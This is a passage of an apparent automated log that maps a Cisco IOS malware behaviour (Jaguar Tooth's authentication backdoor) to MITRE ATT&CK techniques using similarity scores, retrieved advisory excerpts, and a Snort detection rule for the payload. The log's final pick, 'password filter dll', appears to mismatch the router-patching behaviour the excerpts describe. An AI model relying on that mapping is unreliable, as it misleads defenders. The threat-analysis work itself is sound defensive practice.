[2025-04-08 17:33:41,167 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: right-to-left override]: tensor([[0.2116]])
[2025-04-08 17:33:41,313 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: rename system utilities]: tensor([[0.3454]])
[2025-04-08 17:33:41,533 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: masquerade task or service]: tensor([[0.2585]])
[2025-04-08 17:33:41,733 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: match legitimate name or location]: tensor([[0.2614]])
[2025-04-08 17:33:41,875 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: space after filename]: tensor([[0.1872]])
[2025-04-08 17:33:42,035 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: double file extension]: tensor([[0.0874]])
[2025-04-08 17:33:42,200 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: masquerade file type]: tensor([[0.0989]])
[2025-04-08 17:33:42,338 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: break process trees]: tensor([[0.3721]])
[2025-04-08 17:33:42,515 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: masquerade account name]: tensor([[0.2205]])
[2025-04-08 17:33:42,753 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process]: tensor([[0.6129]])
[2025-04-08 17:33:42,963 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: domain controller authentication]: tensor([[0.6288]])
[2025-04-08 17:33:43,048 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: password filter dll]: tensor([[0.6236]])
[2025-04-08 17:33:43,217 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: pluggable authentication modules]: tensor([[0.4911]])
[2025-04-08 17:33:43,433 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: network device authentication]: tensor([[0.7139]])
[2025-04-08 17:33:43,605 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: reversible encryption]: tensor([[0.4870]])
[2025-04-08 17:33:43,888 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: multi-factor authentication]: tensor([[0.5693]])
[2025-04-08 17:33:44,055 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: hybrid identity]: tensor([[0.5731]])
[2025-04-08 17:33:44,159 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: network provider dll]: tensor([[0.6005]])
[2025-04-08 17:33:44,241 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: conditional access policies]: tensor([[0.5460]])
[2025-04-08 17:33:44,340 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure]: tensor([[0.3315]])
[2025-04-08 17:33:44,426 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: create snapshot]: tensor([[0.2350]])
[2025-04-08 17:33:44,516 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: create cloud instance]: tensor([[0.2077]])
[2025-04-08 17:33:44,607 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: delete cloud instance]: tensor([[0.2740]])
[2025-04-08 17:33:44,775 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: revert cloud instance]: tensor([[0.2351]])
[2025-04-08 17:33:44,955 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud compute infrastructure: modify cloud compute configurations]: tensor([[0.2201]])
[2025-04-08 17:33:45,180 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify cloud resource hierarchy]: tensor([[0.2359]])
[2025-04-08 17:33:45,257 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify registry]: tensor([[0.4055]])
[2025-04-08 17:33:45,537 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify system image]: tensor([[0.3623]])
[2025-04-08 17:33:45,786 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify system image: patch system image]: tensor([[0.4172]])
[2025-04-08 17:33:46,049 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify system image: downgrade system image]: tensor([[0.4289]])
[2025-04-08 17:33:46,193 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [network boundary bridging]: tensor([[0.2621]])
[2025-04-08 17:33:46,314 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [network boundary bridging: network address translation traversal]: tensor([[0.3281]])
[2025-04-08 17:33:46,472 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information]: tensor([[0.3677]])
[2025-04-08 17:33:46,616 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: binary padding]: tensor([[0.2865]])
[2025-04-08 17:33:46,966 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: software packing]: tensor([[0.2672]])
[2025-04-08 17:33:47,101 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: steganography]: tensor([[0.1600]])
[2025-04-08 17:33:47,198 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: compile after delivery]: tensor([[0.2385]])
[2025-04-08 17:33:47,418 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: indicator removal from tools]: tensor([[0.3296]])
[2025-04-08 17:33:47,567 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: html smuggling]: tensor([[0.1449]])
[2025-04-08 17:33:47,708 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: dynamic api resolution]: tensor([[0.3497]])
[2025-04-08 17:33:47,870 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: stripped payloads]: tensor([[0.2053]])
[2025-04-08 17:33:48,087 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: embedded payloads]: tensor([[0.2506]])
[2025-04-08 17:33:48,239 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: command obfuscation]: tensor([[0.2726]])
[2025-04-08 17:33:48,383 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: fileless storage]: tensor([[0.1915]])
[2025-04-08 17:33:48,577 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: lnk icon smuggling]: tensor([[0.1757]])
[2025-04-08 17:33:48,711 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: encrypted/encoded file]: tensor([[0.2101]])
[2025-04-08 17:33:48,906 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [obfuscated files or information: polymorphic code]: tensor([[0.2860]])
[2025-04-08 17:33:49,168 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [plist file modification]: tensor([[0.2942]])
[2025-04-08 17:33:49,284 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot]: tensor([[0.3152]])
[2025-04-08 17:33:49,434 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: system firmware]: tensor([[0.1616]])
[2025-04-08 17:33:49,627 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: component firmware]: tensor([[0.3537]])
[2025-04-08 17:33:49,784 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: bootkit]: tensor([[0.2099]])
[2025-04-08 17:33:49,994 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: rommonkit]: tensor([[0.4262]])
[2025-04-08 17:33:50,135 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [pre-os boot: tftp boot]: tensor([[0.2915]])
[2025-04-08 17:33:50,248 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection]: tensor([[0.3865]])
[2025-04-08 17:33:50,412 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: dynamic-link library injection]: tensor([[0.3616]])
[2025-04-08 17:33:50,624 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: portable executable injection]: tensor([[0.3730]])
[2025-04-08 17:33:50,812 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: thread execution hijacking]: tensor([[0.4456]])
[2025-04-08 17:33:50,914 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: asynchronous procedure call]: tensor([[0.4023]])
[2025-04-08 17:33:51,091 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: thread local storage]: tensor([[0.4566]])
[2025-04-08 17:33:51,230 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: ptrace system calls]: tensor([[0.4594]])
[2025-04-08 17:33:51,351 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: proc memory]: tensor([[0.3768]])
[2025-04-08 17:33:51,612 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: extra window memory injection]: tensor([[0.3394]])
[2025-04-08 17:33:51,780 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: process hollowing]: tensor([[0.3535]])
[2025-04-08 17:33:51,983 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: process doppelgänging]: tensor([[0.4210]])
[2025-04-08 17:33:52,073 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: vdso hijacking]: tensor([[0.3788]])
[2025-04-08 17:33:52,231 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [process injection: listplanting]: tensor([[0.3967]])
[2025-04-08 17:33:52,450 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [reflective code loading]: tensor([[0.2366]])
[2025-04-08 17:33:52,574 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [rogue domain controller]: tensor([[0.3240]])
[2025-04-08 17:33:52,661 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [rootkit]: tensor([[0.4101]])
[2025-04-08 17:33:52,773 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls]: tensor([[0.4279]])
[2025-04-08 17:33:52,993 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: gatekeeper bypass]: tensor([[0.3360]])
[2025-04-08 17:33:53,091 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: code signing]: tensor([[0.2821]])
[2025-04-08 17:33:53,195 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: sip and trust provider hijacking]: tensor([[0.4419]])
[2025-04-08 17:33:53,345 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: install root certificate]: tensor([[0.3491]])
[2025-04-08 17:33:53,570 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: mark-of-the-web bypass]: tensor([[0.3475]])
[2025-04-08 17:33:53,738 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [subvert trust controls: code signing policy modification]: tensor([[0.3353]])
[2025-04-08 17:33:53,896 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution]: tensor([[0.4009]])
[2025-04-08 17:33:54,181 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: compiled html file]: tensor([[0.3207]])
[2025-04-08 17:33:54,254 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: control panel]: tensor([[0.3748]])
[2025-04-08 17:33:54,524 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: cmstp]: tensor([[0.4221]])
[2025-04-08 17:33:54,692 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: installutil]: tensor([[0.3197]])
[2025-04-08 17:33:54,850 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: mshta]: tensor([[0.4570]])
[2025-04-08 17:33:55,047 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: msiexec]: tensor([[0.3907]])
[2025-04-08 17:33:55,213 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: odbcconf]: tensor([[0.3139]])
[2025-04-08 17:33:55,319 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: regsvcs/regasm]: tensor([[0.4070]])
[2025-04-08 17:33:55,454 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: regsvr32]: tensor([[0.4067]])
[2025-04-08 17:33:55,675 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: rundll32]: tensor([[0.3537]])
[2025-04-08 17:33:55,872 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: verclsid]: tensor([[0.4016]])
[2025-04-08 17:33:56,056 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: mavinject]: tensor([[0.3705]])
[2025-04-08 17:33:56,219 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: mmc]: tensor([[0.4013]])
[2025-04-08 17:33:56,388 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system binary proxy execution: electron applications]: tensor([[0.1608]])
[2025-04-08 17:33:56,487 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system script proxy execution]: tensor([[0.3960]])
[2025-04-08 17:33:56,769 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system script proxy execution: pubprn]: tensor([[0.3241]])
[2025-04-08 17:33:56,954 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [system script proxy execution: syncappvpublishingserver]: tensor([[0.3664]])
[2025-04-08 17:33:57,147 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [template injection]: tensor([[0.2446]])
[2025-04-08 17:33:57,294 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [traffic signaling]: tensor([[0.3085]])
[2025-04-08 17:33:57,499 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [traffic signaling: port knocking]: tensor([[0.3590]])
[2025-04-08 17:33:57,591 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [traffic signaling: socket filters]: tensor([[0.2781]])
[2025-04-08 17:33:57,826 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [trusted developer utilities proxy execution]: tensor([[0.3713]])
[2025-04-08 17:33:57,986 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [trusted developer utilities proxy execution: msbuild]: tensor([[0.3489]])
[2025-04-08 17:33:58,191 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [trusted developer utilities proxy execution: clickonce]: tensor([[0.3795]])
[2025-04-08 17:33:58,363 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [unused/unsupported cloud regions]: tensor([[0.2260]])
[2025-04-08 17:33:58,599 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material]: tensor([[0.5879]])
[2025-04-08 17:33:58,703 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: application access token]: tensor([[0.5871]])
[2025-04-08 17:33:58,893 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: pass the hash]: tensor([[0.5301]])
[2025-04-08 17:33:59,032 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: pass the ticket]: tensor([[0.3812]])
[2025-04-08 17:33:59,180 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [use alternate authentication material: web session cookie]: tensor([[0.5239]])
[2025-04-08 17:33:59,297 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts]: tensor([[0.5422]])
[2025-04-08 17:33:59,518 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: default accounts]: tensor([[0.2984]])
[2025-04-08 17:33:59,656 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: domain accounts]: tensor([[0.3711]])
[2025-04-08 17:33:59,778 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: local accounts]: tensor([[0.5008]])
[2025-04-08 17:33:59,986 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [valid accounts: cloud accounts]: tensor([[0.2223]])
[2025-04-08 17:34:00,172 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3175]])
[2025-04-08 17:34:00,277 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3363]])
[2025-04-08 17:34:00,519 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3651]])
[2025-04-08 17:34:00,734 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.3017]])
[2025-04-08 17:34:00,852 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [weaken encryption]: tensor([[0.2641]])
[2025-04-08 17:34:01,050 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [weaken encryption: reduce key space]: tensor([[0.2320]])
[2025-04-08 17:34:01,222 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [weaken encryption: disable crypto hardware]: tensor([[0.3607]])
[2025-04-08 17:34:01,415 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [xsl script processing]: tensor([[0.0250]])
[2025-04-08 17:34:01,437 INFO] ++ Scores: [('modify authentication process: network device authentication', tensor([[0.7139]])), ('modify authentication process: domain controller authentication', tensor([[0.6288]])), ('modify authentication process: password filter dll', tensor([[0.6236]])), ('modify authentication process', tensor([[0.6129]])), ('modify authentication process: network provider dll', tensor([[0.6005]]))]
[2025-04-08 17:34:01,438 INFO] ++ Similar techniques found:
['modify authentication process: network device authentication', 'modify authentication process: domain controller authentication', 'modify authentication process: password filter dll', 'modify authentication process', 'modify authentication process: network provider dll']
[2025-04-08 17:34:01,438 INFO] ++ Querying the QA model for action Modify Authentication Process as used by the malware with the following context:
modify authentication process: network device authentication
modify authentication process: domain controller authentication
modify authentication process: password filter dll
modify authentication process
modify authentication process: network provider dll
[2025-04-08 17:34:02,626 INFO] ++ QA suggested technique: modify authentication process: password filter dll
[2025-04-08 17:34:02,626 INFO] ++ Selected technique: modify authentication process: password filter dll
[2025-04-08 17:34:06,119 INFO] ++ Refining the action: Modify Authentication Process as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='d11294e9-bea6-4d96-8c79-bee7bd01138d', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Added comments to the Workaround configuration commands to document which exclusions tie to the vulnerable MIBs.Vulnerable Products, WorkaroundsInterim2017-JUL-031.0Initial public release.—Interim2017-JUN-29Show LessLegal DisclaimerTHIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Don’t reuse the same password for multiple devices.\n\nEach device should have a unique password.\n\nWhere possible, avoid legacy password-based authentication and implement two-factor authentication based on public-private key.Disable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.')]
[2025-04-08 17:34:31,652 INFO] ++ Pre-conditions computed for action: Modify Authentication Process as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It enables unauthenticated backdoor access by patching Cisco IOS authentication routines .\n\nThis \ngrants access to existing local accounts  without checking the provided password, when connecting \nvia Telnet or physical session .\n\nFurther details are discussed in the ‘Functionality ( Unauthenticated \nbackdoor )’ section of this report.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='Malware Deployment  \nFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’s Jaguar Tooth Malware Analysis Report\n.\n\nThis \nmalware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.')]
[2025-04-08 17:34:44,095 INFO] ++ Post-conditions computed for action: Modify Authentication Process as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It enables unauthenticated backdoor access by patching Cisco IOS authentication routines .\n\nThis \ngrants access to existing local accounts  without checking the provided password, when connecting \nvia Telnet or physical session .\n\nFurther details are discussed in the ‘Functionality ( Unauthenticated \nbackdoor )’ section of this report.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in 